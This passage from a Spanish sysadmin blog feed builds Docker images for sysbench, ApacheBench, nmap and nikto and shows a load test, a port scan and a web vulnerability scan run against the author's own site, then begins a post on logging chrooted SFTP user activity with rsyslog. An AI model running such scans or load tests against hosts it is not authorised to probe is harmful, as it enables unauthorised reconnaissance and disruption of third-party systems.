&lt;p&gt;Existe una aplicación llamada &lt;strong&gt;sysbench&lt;/strong&gt; que hace una batería de pruebas para determinar el rendimiento de los parámetros básicos de una máquina. Como no podemos ir instalando este paquete, y como no tenemos la certeza que el sistema operativo del servidor soporte este binario, lo podemos poner en un contenedor y acompañarlo del sistema operativo que nos apetezca.&lt;/p&gt;
&lt;p&gt;En este caso, el contenedor ejecuta usando los recursos de la máquina &lt;em&gt;host&lt;/em&gt;, y eso es precisamente lo que &lt;strong&gt;sysbench&lt;/strong&gt; mide. Así obtendremos diferentes resultados en cada máquina, a pesar de que la imagen es la misma.&lt;/p&gt;
&lt;p&gt;La mala noticia es que este paquete no está disponible para &lt;strong&gt;Alpine Linux&lt;/strong&gt;, así que usaré otra imagen, por ejemplo, &lt;strong&gt;Debian Jessie&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ cat sysbench/Dockerfile 
FROM debian:jessie
RUN apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apt-get install -y sysbench &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm -rf /var/lib/apt/lists/*
COPY bench.sh /
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bench.sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@hermes:~/docker/tools$ cat sysbench/bench.sh 
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="c1"&gt;# CPU&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;CPU: &lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;sysbench --test&lt;span class="o"&gt;=&lt;/span&gt;cpu run &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s2"&gt;&amp;quot;total time:&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; awk &lt;span class="s1"&gt;&amp;#39;{print $3}&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;

&lt;span class="c1"&gt;# Memory&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Memory: &lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;sysbench --test&lt;span class="o"&gt;=&lt;/span&gt;memory run &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s2"&gt;&amp;quot;transferred&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; cut -d&lt;span class="se"&gt;\(&lt;/span&gt; -f2 &lt;span class="p"&gt;|&lt;/span&gt; cut -d&lt;span class="se"&gt;\)&lt;/span&gt; -f1&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;

&lt;span class="c1"&gt;# Disk&lt;/span&gt;
sysbench --test&lt;span class="o"&gt;=&lt;/span&gt;fileio prepare &amp;gt; /dev/null
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Disk: &lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;sysbench --test&lt;span class="o"&gt;=&lt;/span&gt;fileio --file-test-mode&lt;span class="o"&gt;=&lt;/span&gt;rndrw run &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s2"&gt;&amp;quot;transferred&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; cut -d&lt;span class="se"&gt;\(&lt;/span&gt; -f2 &lt;span class="p"&gt;|&lt;/span&gt; cut -d&lt;span class="se"&gt;\)&lt;/span&gt; -f1&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
sysbench --test&lt;span class="o"&gt;=&lt;/span&gt;fileio cleanup &amp;gt; /dev/null
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;CUIDADO&lt;/strong&gt;: el &lt;em&gt;script bench.sh&lt;/em&gt; tiene permisos de ejecución, por lo que también lo tendrá en la imagen.&lt;/p&gt;
&lt;p&gt;Tras construir o hacer el correspondiente &lt;em&gt;docker pull&lt;/em&gt;, comprobamos que el tamaño es bastante superior, debido al sistema operativo base.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ docker build -t sysbench sysbench/
...  
gerard@hermes:~/docker/tools$ docker images
REPOSITORY                                                                            TAG                 IMAGE ID            CREATED             SIZE
sysbench                                                                              latest              ec75e66aae41        &lt;span class="m"&gt;5&lt;/span&gt; seconds ago       &lt;span class="m"&gt;127&lt;/span&gt;.1 MB
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo queda ejecutar para ver el rendimiento de la máquina testeada, sin dejar basura en la máquina destino.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ docker run --rm sysbench
CPU: &lt;span class="m"&gt;11&lt;/span&gt;.1682s
Memory: &lt;span class="m"&gt;3059&lt;/span&gt;.66 MB/sec
Disk: &lt;span class="m"&gt;12&lt;/span&gt;.088Mb/sec
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Pruebas de carga web&lt;/h2&gt;
&lt;p&gt;Hay muchas herramientas en este campo, pero a mi me sigue gustando mucho el &lt;em&gt;Apache benchmark&lt;/em&gt;. El binario &lt;strong&gt;ab&lt;/strong&gt; se suele encontrar en el paquete &lt;strong&gt;apache2-utils&lt;/strong&gt; y este está disponible en &lt;strong&gt;Alpine Linux&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ cat ab/Dockerfile 
FROM alpine:3.4
RUN apk add --no-cache apache2-utils
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/bin/ab&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Conseguimos nuestra imagen por los medios habituales; la imagen no llega a los 10 mb.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ docker build -t ab ab/
...  
gerard@hermes:~/docker/tools$ docker images
REPOSITORY                                                                            TAG                 IMAGE ID            CREATED             SIZE
ab                                                                                    latest              51b78f9dfeea        &lt;span class="m"&gt;4&lt;/span&gt; seconds ago       &lt;span class="m"&gt;9&lt;/span&gt;.808 MB
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y solo nos queda testear contra la víctima de nuestra prueba de estrés.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ docker run --rm ab -k -c5 -t5 http://www.linuxsysadmin.tk/
This is ApacheBench, Version &lt;span class="m"&gt;2&lt;/span&gt;.3 &amp;lt;&lt;span class="nv"&gt;$Revision&lt;/span&gt;: &lt;span class="m"&gt;1748469&lt;/span&gt; $&amp;gt;
Copyright &lt;span class="m"&gt;1996&lt;/span&gt; Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/
Licensed to The Apache Software Foundation, http://www.apache.org/

Benchmarking www.linuxsysadmin.tk &lt;span class="o"&gt;(&lt;/span&gt;be patient&lt;span class="o"&gt;)&lt;/span&gt;
Completed &lt;span class="m"&gt;5000&lt;/span&gt; requests
Completed &lt;span class="m"&gt;10000&lt;/span&gt; requests
Finished &lt;span class="m"&gt;10152&lt;/span&gt; requests


Server Software:        GitHub.com
Server Hostname:        www.linuxsysadmin.tk
Server Port:            &lt;span class="m"&gt;80&lt;/span&gt;

Document Path:          /
Document Length:        &lt;span class="m"&gt;37545&lt;/span&gt; bytes

Concurrency Level:      &lt;span class="m"&gt;5&lt;/span&gt;
Time taken &lt;span class="k"&gt;for&lt;/span&gt; tests:   &lt;span class="m"&gt;5&lt;/span&gt;.001 seconds
Complete requests:      &lt;span class="m"&gt;10152&lt;/span&gt;
Failed requests:        &lt;span class="m"&gt;0&lt;/span&gt;
Keep-Alive requests:    &lt;span class="m"&gt;10152&lt;/span&gt;
Total transferred:      &lt;span class="m"&gt;387253740&lt;/span&gt; bytes
HTML transferred:       &lt;span class="m"&gt;381176513&lt;/span&gt; bytes
Requests per second:    &lt;span class="m"&gt;2030&lt;/span&gt;.04 &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="c1"&gt;#/sec] (mean)&lt;/span&gt;
Time per request:       &lt;span class="m"&gt;2&lt;/span&gt;.463 &lt;span class="o"&gt;[&lt;/span&gt;ms&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;mean&lt;span class="o"&gt;)&lt;/span&gt;
Time per request:       &lt;span class="m"&gt;0&lt;/span&gt;.493 &lt;span class="o"&gt;[&lt;/span&gt;ms&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;mean, across all concurrent requests&lt;span class="o"&gt;)&lt;/span&gt;
Transfer rate:          &lt;span class="m"&gt;75622&lt;/span&gt;.04 &lt;span class="o"&gt;[&lt;/span&gt;Kbytes/sec&lt;span class="o"&gt;]&lt;/span&gt; received

Connection Times &lt;span class="o"&gt;(&lt;/span&gt;ms&lt;span class="o"&gt;)&lt;/span&gt;
              min  mean&lt;span class="o"&gt;[&lt;/span&gt;+/-sd&lt;span class="o"&gt;]&lt;/span&gt; median   max
Connect:        &lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="m"&gt;0&lt;/span&gt;   &lt;span class="m"&gt;0&lt;/span&gt;.0      &lt;span class="m"&gt;0&lt;/span&gt;       &lt;span class="m"&gt;1&lt;/span&gt;
Processing:     &lt;span class="m"&gt;2&lt;/span&gt;    &lt;span class="m"&gt;2&lt;/span&gt;   &lt;span class="m"&gt;3&lt;/span&gt;.9      &lt;span class="m"&gt;2&lt;/span&gt;     &lt;span class="m"&gt;216&lt;/span&gt;
Waiting:        &lt;span class="m"&gt;1&lt;/span&gt;    &lt;span class="m"&gt;2&lt;/span&gt;   &lt;span class="m"&gt;2&lt;/span&gt;.5      &lt;span class="m"&gt;1&lt;/span&gt;     &lt;span class="m"&gt;109&lt;/span&gt;
Total:          &lt;span class="m"&gt;2&lt;/span&gt;    &lt;span class="m"&gt;2&lt;/span&gt;   &lt;span class="m"&gt;3&lt;/span&gt;.9      &lt;span class="m"&gt;2&lt;/span&gt;     &lt;span class="m"&gt;216&lt;/span&gt;

Percentage of the requests served within a certain &lt;span class="nb"&gt;time&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;ms&lt;span class="o"&gt;)&lt;/span&gt;
  &lt;span class="m"&gt;50&lt;/span&gt;%      &lt;span class="m"&gt;2&lt;/span&gt;
  &lt;span class="m"&gt;66&lt;/span&gt;%      &lt;span class="m"&gt;2&lt;/span&gt;
  &lt;span class="m"&gt;75&lt;/span&gt;%      &lt;span class="m"&gt;2&lt;/span&gt;
  &lt;span class="m"&gt;80&lt;/span&gt;%      &lt;span class="m"&gt;2&lt;/span&gt;
  &lt;span class="m"&gt;90&lt;/span&gt;%      &lt;span class="m"&gt;3&lt;/span&gt;
  &lt;span class="m"&gt;95&lt;/span&gt;%      &lt;span class="m"&gt;3&lt;/span&gt;
  &lt;span class="m"&gt;98&lt;/span&gt;%      &lt;span class="m"&gt;4&lt;/span&gt;
  &lt;span class="m"&gt;99&lt;/span&gt;%      &lt;span class="m"&gt;4&lt;/span&gt;
 &lt;span class="m"&gt;100&lt;/span&gt;%    &lt;span class="m"&gt;216&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;longest request&lt;span class="o"&gt;)&lt;/span&gt;
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Pruebas de penetración de puertos&lt;/h2&gt;
&lt;p&gt;La herramienta más versátil en este campo es &lt;strong&gt;nmap&lt;/strong&gt;. El uso de este comando no es trivial, y un &lt;em&gt;pentester&lt;/em&gt; experto puede hacer cosas realmente impresionantes. De momento nos basta con que funcione.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ cat nmap/Dockerfile 
FROM alpine:3.4
RUN apk add --no-cache nmap
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/bin/nmap&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Usamos el anterior &lt;em&gt;Dockerfile&lt;/em&gt; para crear la imagen (o hacemos el &lt;em&gt;docker pull&lt;/em&gt; correspondiente) y vemos que la imagen se nos va a 18 mb. Nada mal.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ docker build -t nmap nmap/
...  
gerard@hermes:~/docker/tools$ docker images
REPOSITORY                                                                            TAG                 IMAGE ID            CREATED             SIZE
nmap                                                                                  latest              d808ce19de05        &lt;span class="m"&gt;4&lt;/span&gt; seconds ago       &lt;span class="m"&gt;17&lt;/span&gt;.58 MB
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos faltaría probar que todo funciona, lanzando un contenedor para testear alguna IP o nombre de dominio. En este caso, con escanear los puertos web, ssh, mongodb y mysql, nos vale. El resultado es que solamente los puertos web están abiertos, con un &lt;em&gt;firewall&lt;/em&gt; cortando los demás.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ docker run --rm nmap www.linuxsysadmin.tk -p80,443,22,27017,3306 -Pn

Starting Nmap &lt;span class="m"&gt;7&lt;/span&gt;.12 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at &lt;span class="m"&gt;2016&lt;/span&gt;-12-21 &lt;span class="m"&gt;10&lt;/span&gt;:14 UTC
Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; www.linuxsysadmin.tk &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;151&lt;/span&gt;.101.0.133&lt;span class="o"&gt;)&lt;/span&gt;
Host is up &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.0011s latency&lt;span class="o"&gt;)&lt;/span&gt;.
Other addresses &lt;span class="k"&gt;for&lt;/span&gt; www.linuxsysadmin.tk &lt;span class="o"&gt;(&lt;/span&gt;not scanned&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;151&lt;/span&gt;.101.192.133 &lt;span class="m"&gt;151&lt;/span&gt;.101.128.133 &lt;span class="m"&gt;151&lt;/span&gt;.101.64.133
PORT      STATE    SERVICE
&lt;span class="m"&gt;22&lt;/span&gt;/tcp    filtered ssh
&lt;span class="m"&gt;80&lt;/span&gt;/tcp    open     http
&lt;span class="m"&gt;443&lt;/span&gt;/tcp   open     https
&lt;span class="m"&gt;3306&lt;/span&gt;/tcp  filtered mysql
&lt;span class="m"&gt;27017&lt;/span&gt;/tcp filtered mongod

Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in &lt;span class="m"&gt;1&lt;/span&gt;.41 seconds
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Pruebas de seguridad web&lt;/h2&gt;
&lt;p&gt;Una &lt;em&gt;suite&lt;/em&gt; muy interesante para descubrir vulnerabilidades web es &lt;strong&gt;nikto&lt;/strong&gt;. Se trata de un &lt;em&gt;script&lt;/em&gt; de &lt;strong&gt;perl&lt;/strong&gt; bastante completo, que va a probar las vulnerabilidades conocidas y nos va a dar los códigos en la &lt;a href="https://en.wikipedia.org/wiki/Open_Source_Vulnerability_Database"&gt;Open_Source_Vulnerability_Database&lt;/a&gt;, ahora cerrada.&lt;/p&gt;
&lt;p&gt;Para obtener nuestra imagen, basta con instalar el paquete en una imagen &lt;strong&gt;Alpine Linux&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ cat nikto/Dockerfile 
FROM alpine:3.4
RUN apk add --no-cache nikto
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/bin/nikto.pl&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras la construcción vemos que esta imagen es la mas grande de las anteriormente mencionadas, de entre las que hemos basado en &lt;strong&gt;Alpine Linux&lt;/strong&gt;, ocupando mas de 60 mb; pensad en el tamaño de una máquina virtual dedicada: no bajaría de 1 gb.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ docker build -t nikto nikto/
...  
gerard@hermes:~/docker/tools$ docker images
REPOSITORY                                                                            TAG                 IMAGE ID            CREATED             SIZE
nikto                                                                                 latest              9167dce64715        &lt;span class="m"&gt;3&lt;/span&gt; seconds ago       &lt;span class="m"&gt;61&lt;/span&gt;.05 MB
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El comando &lt;strong&gt;nikto&lt;/strong&gt; tiene muchas opciones, que saltan a la vista si usáis el contenedor sin parámetros adicionales. Para verificar su funcionamiento me voy a limitar a escanear un solo &lt;em&gt;host&lt;/em&gt; con la batería de pruebas estándares.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ docker run --rm nikto -host www.linuxsysadmin.tk
- ***** SSL support not available &lt;span class="o"&gt;(&lt;/span&gt;see docs &lt;span class="k"&gt;for&lt;/span&gt; SSL install&lt;span class="o"&gt;)&lt;/span&gt; *****
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          &lt;span class="m"&gt;151&lt;/span&gt;.101.192.133
+ Target Hostname:    www.linuxsysadmin.tk
+ Target Port:        &lt;span class="m"&gt;80&lt;/span&gt;
+ Start Time:         &lt;span class="m"&gt;2016&lt;/span&gt;-12-21 &lt;span class="m"&gt;10&lt;/span&gt;:19:15 &lt;span class="o"&gt;(&lt;/span&gt;GMT0&lt;span class="o"&gt;)&lt;/span&gt;
---------------------------------------------------------------------------
+ Server: GitHub.com
+ Retrieved via header: &lt;span class="m"&gt;1&lt;/span&gt;.1 varnish
+ Retrieved x-served-by header: cache-cdg8733-CDG
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header &lt;span class="s1"&gt;&amp;#39;x-github-request-id&amp;#39;&lt;/span&gt; found, with contents: 689C5D15:51BA:5DE0B1A:585A54BB
+ Uncommon header &lt;span class="s1"&gt;&amp;#39;x-served-by&amp;#39;&lt;/span&gt; found, with contents: cache-cdg8733-CDG
+ Uncommon header &lt;span class="s1"&gt;&amp;#39;x-fastly-request-id&amp;#39;&lt;/span&gt; found, with contents: 43f82a2690743c1b1b674d92672b1e277016f83e
+ Uncommon header &lt;span class="s1"&gt;&amp;#39;x-cache-hits&amp;#39;&lt;/span&gt; found, with contents: &lt;span class="m"&gt;3&lt;/span&gt;
+ Uncommon header &lt;span class="s1"&gt;&amp;#39;access-control-allow-origin&amp;#39;&lt;/span&gt; found, with contents: *
+ Uncommon header &lt;span class="s1"&gt;&amp;#39;x-timer&amp;#39;&lt;/span&gt; found, with contents: S1482315555.254611,VS0,VE0
+ Uncommon header &lt;span class="s1"&gt;&amp;#39;x-cache&amp;#39;&lt;/span&gt; found, with contents: HIT
+ Server leaks inodes via ETags, header found with file /JoHeWXqS.AP, fields: 0x585799bc 0x8045 
+ No CGI Directories found &lt;span class="o"&gt;(&lt;/span&gt;use &lt;span class="s1"&gt;&amp;#39;-C all&amp;#39;&lt;/span&gt; to force check all possible &lt;span class="nb"&gt;dirs&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+ Uncommon header &lt;span class="s1"&gt;&amp;#39;content-security-policy&amp;#39;&lt;/span&gt; found, with contents: default-src &lt;span class="s1"&gt;&amp;#39;none&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; style-src &lt;span class="s1"&gt;&amp;#39;unsafe-inline&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; img-src data:&lt;span class="p"&gt;;&lt;/span&gt; connect-src &lt;span class="s1"&gt;&amp;#39;self&amp;#39;&lt;/span&gt;
+ Server banner has changed from &lt;span class="s1"&gt;&amp;#39;GitHub.com&amp;#39;&lt;/span&gt; to &lt;span class="s1"&gt;&amp;#39;Varnish&amp;#39;&lt;/span&gt; which may suggest a WAF, load balancer or proxy is in place
+ OSVDB-3092: /sitemap.xml: This gives a nice listing of the site content.
+ &lt;span class="m"&gt;6544&lt;/span&gt; items checked: &lt;span class="m"&gt;0&lt;/span&gt; error&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt; and &lt;span class="m"&gt;13&lt;/span&gt; item&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt; reported on remote host
+ End Time:           &lt;span class="m"&gt;2016&lt;/span&gt;-12-21 &lt;span class="m"&gt;10&lt;/span&gt;:31:23 &lt;span class="o"&gt;(&lt;/span&gt;GMT0&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;728&lt;/span&gt; seconds&lt;span class="o"&gt;)&lt;/span&gt;
---------------------------------------------------------------------------
+ &lt;span class="m"&gt;1&lt;/span&gt; host&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt; tested
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;</content><category term="toolbox"></category><category term="docker"></category><category term="pwgen"></category><category term="sysbench"></category><category term="apache benchmark"></category><category term="nmap"></category><category term="nikto"></category></entry><entry><title>Auditando las acciones de los usuarios de nuestro SFTP</title><link href="http://www.linuxsysadmin.ml/2017/04/auditando-las-acciones-de-los-usuarios-de-nuestro-sftp.html" rel="alternate"></link><published>2017-04-03T10:00:00+02:00</published><updated>2017-04-03T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-04-03:/2017/04/auditando-las-acciones-de-los-usuarios-de-nuestro-sftp.html</id><summary type="html">&lt;p&gt;Algunas veces me he encontrado con usuarios de alguno de mis servidores SFTP que se quejan porque "les desaparecen archivos". Si estamos seguros que esas desapariciones no tienen nada que ver con nosotros, lo mas probable es que lo hayan hecho los mismos usuarios, sea manualmente o de forma automática …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Algunas veces me he encontrado con usuarios de alguno de mis servidores SFTP que se quejan porque "les desaparecen archivos". Si estamos seguros que esas desapariciones no tienen nada que ver con nosotros, lo mas probable es que lo hayan hecho los mismos usuarios, sea manualmente o de forma automática.&lt;/p&gt;
&lt;p&gt;En casos así, no podemos hacer nada para demostrar cuando y porqué ha pasado, pero podemos pillar al usuario &lt;em&gt;in fraganti&lt;/em&gt; en casos posteriores. Para eso solo es necesario habilitar un nivel de trazas que nos permita capturar la actividad de un usuario.&lt;/p&gt;
&lt;p&gt;El mismo servidor SFTP nos enviará esta actividad al &lt;em&gt;rsyslog&lt;/em&gt; de forma automática si habilitamos el &lt;em&gt;loglevel&lt;/em&gt; adecuado a nuestro comando SFTP. A partir de aquí se asume que el servicio &lt;em&gt;rsyslog&lt;/em&gt; está instalado en nuestro sistema.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;admin@sftpserver:~$ cat /etc/ssh/ssh_config 
...
ForceCommand internal-sftp -l VERBOSE
...
admin@sftpserver:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esta directiva nos va a enviar las trazas al &lt;em&gt;rsyslog&lt;/em&gt; escribiendo los mensajes en &lt;em&gt;/dev/log&lt;/em&gt;, &lt;strong&gt;siempre desde el punto de vista de la sesión activa&lt;/strong&gt;. Eso significa que si hemos enjaulado a nuestros usuarios, la posición del dispositivo no será la de siempre; un usuario enjaulado en &lt;em&gt;/srv/jails/guest/&lt;/em&gt; debería tener el dispositivo en &lt;em&gt;/srv/jails/guest/dev/log&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;La parte buena es que el mismo &lt;em&gt;rsyslog&lt;/em&gt; se encarga de crear ese dispositivo para nosotros, con la configuración adecuada. Solo necesitamos crear la carpeta &lt;em&gt;dev/&lt;/em&gt; en la jaula de nuestro usuario y añadir la directiva correcta.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;admin@sftpserver:~$ mkdir /srv/jails/guest/dev
admin@sftpserver:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El otro punto espinoso es que la configuración del &lt;em&gt;rsyslog&lt;/em&gt; no lleva ninguna regla por defecto para guardar esos &lt;em&gt;logs&lt;/em&gt; en ningún fichero. Con añadir una nueva línea a la configuración de nuestro &lt;em&gt;rsyslog&lt;/em&gt; será suficiente.&lt;/p&gt;
&lt;p&gt;Podemos añadir ambas directivas mediante un fichero de configuración nuevo, utilizando la carpeta &lt;em&gt;/etc/rsyslog.d/&lt;/em&gt;, como sigue:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;admin@sftpserver:~$ cat /etc/rsyslog.d/jails.conf 
&lt;span class="nv"&gt;$AddUnixListenSocket&lt;/span&gt; /srv/jails/guest/dev/log

:programname, isequal, &lt;span class="s2"&gt;&amp;quot;internal-sftp&amp;quot;&lt;/span&gt; -/var/log/sftp.log
admin@sftpserver:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y tras recargar la configuración de los servicios SFTP y &lt;em&gt;rsyslog&lt;/em&gt;, habremos acabado y podremos ver el resultado funcionando, asumiendo que haya entrado alguna sesión desde la recarga de los servicios.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;admin@sftpserver:~$ cat /var/log/sftp.log
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:02:31 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: session opened &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nb"&gt;local&lt;/span&gt; user guest from &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.1&lt;span class="o"&gt;]&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:02:31 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: received client version &lt;span class="m"&gt;3&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:02:31 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: realpath &lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:02:50 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: opendir &lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:02:50 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: closedir &lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:02:50 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: lstat name &lt;span class="s2"&gt;&amp;quot;/archives&amp;quot;&lt;/span&gt;
